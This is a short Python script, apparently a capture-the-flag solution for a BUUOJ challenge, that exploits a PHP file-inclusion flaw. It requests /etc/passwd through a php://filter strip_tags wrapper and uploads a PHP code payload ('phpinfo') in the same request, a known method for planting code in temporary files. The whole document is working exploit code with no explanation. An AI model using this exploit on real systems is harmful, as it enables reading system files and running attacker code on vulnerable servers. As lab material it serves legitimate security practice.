import requests
from io import BytesIO
url = "http://45b561ac-da6c-413f-ac46-3b55eb7a9bb2.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
payload = "<?php phpinfo();?>"
files = {
    "file": BytesIO(payload.encode())
}
r = requests.post(url=url, files=files, allow_redirects=False)

print(r.text)
